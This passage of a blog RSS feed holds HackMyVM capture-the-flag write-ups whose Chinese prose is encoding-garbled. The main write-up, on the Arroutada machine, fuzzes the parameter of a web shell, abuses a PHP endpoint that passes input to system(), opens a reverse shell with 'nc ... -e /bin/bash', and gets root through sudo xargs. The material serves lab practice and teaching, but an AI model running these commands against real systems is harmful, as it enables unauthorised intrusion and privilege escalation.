â””â”€$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000001999:   200        1 L      3 W        54 Ch       'pass'                                                              
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 41.29983
Processed Requests: 56690
Filtered Requests: 56689
Requests/sec.: 1372.644

â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=pass'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                        
```

ä½¿ç”¨aå‚æ•°å¼¹ä¸ªshellå›æ¥å°±å¥½äº†

# 3. è·å¾—ç¨³å®šçš„ Shell

è·å–**åå‘ shell** åï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å¾—ç¨³å®šçš„**äº¤äº’å¼** **TTY shell**ï¼š

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ææƒ

```
www-data@arroutada:/var/www/html$ ls -al
total 24
drwxr-xr-x  4 root root 4096 Jan  8  2023 .
drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
-rw-r--r--  1 root root   59 Jan  8  2023 index.html
drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
www-data@arroutada:/var/www/html$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@arroutada:/var/www/html$ cd ..
www-data@arroutada:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
drwxr-xr-x  4 root root 4096 Jan  8  2023 html
www-data@arroutada:/var/www$ cd ..
www-data@arroutada:/var$ ls -al
total 48
drwxr-xr-x 12 root root  4096 Jan  8  2023 .
drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -&gt; /run/lock
drwxr-xr-x  8 root root  4096 Jan  8  2023 log
drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
lrwxrwxrwx  1 root root     4 Jan  8  2023 run -&gt; /run
drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  3 root root  4096 Jan  8  2023 www
www-data@arroutada:/var$ cd /home/
www-data@arroutada:/home$ ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
www-data@arroutada:/home$ cd /opt/
www-data@arroutada:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan  8  2023 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/opt$ cd /tmp/
www-data@arroutada:/tmp$ sl -al
bash: sl: command not found
www-data@arroutada:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  8 03:46 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
www-data@arroutada:/tmp$ cd /
www-data@arroutada:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Jan  8  2023 .
drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
drwxr-xr-x   3 root root  4096 Jan  8  2023 home
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Jan  8  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan  8  2023 media
drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
drwx------   3 root root  4096 Jan  8  2023 root
drwxr-xr-x  17 root root   480 Feb  8 03:46 run
lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
drwxr-xr-x  12 root root  4096 Jan  8  2023 var
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
www-data@arroutada:/$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@arroutada:/$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             
```

æœ‰ä¸ª8000ç«¯å£æ²¡æœ‰å…¬å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è½¬å‘ï¼Œä½†æ˜¯å®ƒsocatå°‘äº†soï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ‰¾å…¶ä»–çš„å·¥å…·å§

```
www-data@arroutada:/tmp$ curl http://127.0.0.1:5000
bash: curl: command not found
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
--2025-02-08 04:00:55--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================&gt;]     319  --.-KB/s    in 0s    

2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]

www-data@arroutada:/tmp$ ls -la
total 476
drwxrwxrwt  2 root     root       4096 Feb  8 04:00 .
drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
www-data@arroutada:/tmp$ cat index.html 
&lt;h1&gt;Service under maintenance&lt;/h1&gt;


&lt;br&gt;


&lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;

&lt;!-- Please sanitize /priv.php --&gt;

```

![image](assets/image-20250208171809-5xkbgq0.png)

é‚£æˆ‘ä»¬çœ‹å®ƒæç¤ºçš„/priv.php

```
www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                                                       [&lt;=&gt;                                                                    priv.php                                                       [ &lt;=&gt;                                                                                                                                     ]     308  --.-KB/s    in 0s    

2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ cat priv.php 
Error: the 'command' parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/

```

è¯´æˆ‘ä»¬å°‘äº†å‚æ•°ï¼Œæˆ‘ä»¬åŠ ä¸Šå°±å¥½äº†

```
www-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -
drito


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the 'command' parameter is not specified in the request body.';
}

*/

```

åˆ©ç”¨

```
www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
```

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)

```

è·å–**åå‘ shell** åï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å¾—ç¨³å®šçš„**äº¤äº’å¼** **TTY shell**ï¼š

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

ææƒ

```
drito@arroutada:~/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs

```

https://gtfobins.github.io/gtfobins/xargs/#sudo

```
drito@arroutada:~/web$ sudo xargs -a /dev/null bash
root@arroutada:/home/drito/web# id
uid=0(root) gid=0(root) groups=0(root)
```

â€ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Arroutada.html</guid><pubDate>Thu, 20 Mar 2025 07:53:18 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPH.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches

# 0. ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.143
**æœ¬æœº IP**ï¼š192.168.205.141

# 1. æ‰«æ

é¦–å…ˆï¼Œé€šè¿‡ `nmap` å¯¹é¶æœºè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œæ£€æŸ¥å¼€æ”¾ç«¯å£å’ŒæœåŠ¡ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
Nmap scan report for 192.168.205.143
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

ä»æ‰«æç»“æœå¯ä»¥çœ‹åˆ°ï¼Œé¶æœºå¼€å¯äº† **SSH** å’Œ **HTTP** æœåŠ¡ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Apaches.html</guid><pubDate>Thu, 20 Mar 2025 07:52:16 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPH.github.io/post/hmv_airbind.html</link><description># hmv_airbind

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=airbind
**éš¾åº¦**ï¼šé»„è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.212
**æœ¬æœº** IPï¼š192.168.205.141

---

### **1. ç«¯å£æšä¸¾åŠæœåŠ¡æ¢æµ‹**

é¦–å…ˆï¼Œä½¿ç”¨ `nmap` æ‰«æç›®æ ‡ IP çš„å¼€æ”¾ç«¯å£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
Nmap scan report for 192.168.205.212
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡æœºå™¨å¼€æ”¾äº† 22 (SSH) å’Œ 80 (HTTP) ç«¯å£ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_airbind.html</guid><pubDate>Thu, 20 Mar 2025 07:51:14 +0000</pubDate></item><item><title>æ–°å¹´å¿«ä¹ï¼</title><link>https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># æ–°å¹´å¿«ä¹ï¼

æ–°çš„ä¸€å¹´ï¼Œæ„¿ä½ å¦‚ä¸œé£ç ´æµªï¼Œäº‹ä¸šè’¸è’¸æ—¥ä¸Šï¼Œç”Ÿæ´»ç¾æ»¡å¦‚æ„ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Thu, 20 Mar 2025 07:50:13 +0000</pubDate></item><item><title>ç¾¤ä¸»é¢˜</title><link>https://7r1UMPH.github.io/post/qun-zhu-ti.html</link><description># ç¾¤ä¸»é¢˜

å¥½ä¹…æ²¡æ‰“è¿‡é¶æœºäº†ï¼Œä¹Ÿæ²¡æ›´æ–°è¿‡ï¼Œä»Šå¤©åœ¨ç¾¤é‡Œçœ‹åˆ°äº†ç¾¤ä¸»å‘äº†ä¸€ä¸ªé¢˜ç›®å°±ç©äº†ä¸€ä¸‹ï¼Œé¡ºä¾¿æ°´ä¸€æœŸwp

é¢˜ç›®ï¼š

![image](assets/image-20250228232434-jasrmaw.png)

```
PATH=/usr/bin
read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
eval '$INPUT'
```

æµ…ç„äº†ä¸€çœ¼ï¼Œå‘ç°`tr`â€‹åˆ é™¤äº†æ‰€æœ‰å­—æ¯ã€æ•°å­—å’Œæ–œæ ï¼Œä½†ä¿ç•™ç‰¹æ®Šç¬¦å·ï¼Œé‚£å°±æœ‰æå¤´

ps:`$@`â€‹ åœ¨ Shell ä¸­è¡¨ç¤ºè„šæœ¬çš„æ‰€æœ‰å‚æ•°ï¼Œå¯è¢« `eval`â€‹ è§£æã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/qun-zhu-ti.html</guid><pubDate>Thu, 20 Mar 2025 07:49:11 +0000</pubDate></item><item><title>æ¨¡æ¿</title><link>https://7r1UMPH.github.io/post/mo-ban.html</link><description># æ¨¡æ¿

# 0.ç®€ä»‹

**é¶æœº**ï¼š  
**éš¾åº¦**ï¼šç»¿è‰²  
**ç›®æ ‡ IP**ï¼š192.168.205.129  
**æœ¬æœº IP**ï¼š192.168.205.128

# 1.æ‰«æ

â€‹`nmap`â€‹èµ·æ‰‹

# 2.è¸©ç‚¹

# 3. è·å¾—ç¨³å®šçš„ Shell

è·å–**åå‘ shell** åï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å¾—ç¨³å®šçš„**äº¤äº’å¼** **TTY shell**ï¼š

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ææƒ

â€

â€ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/mo-ban.html</guid><pubDate>Thu, 20 Mar 2025 07:48:09 +0000</pubDate></item><item><title>æ‘¸é±¼</title><link>https://7r1UMPH.github.io/post/mo-yu.html</link><description># æ‘¸é±¼

è¿‡å¹´äº†ï¼Œæ­‡å‡ å¤©

![Image](https://github.com/user-attachments/assets/c5154a65-21eb-4886-8298-9622caf68d90)ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/mo-yu.html</guid><pubDate>Thu, 20 Mar 2025 07:47:08 +0000</pubDate></item></channel></rss>